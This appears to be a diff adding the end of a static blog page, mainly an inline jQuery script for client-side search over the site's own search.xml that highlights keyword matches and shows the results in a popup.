+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
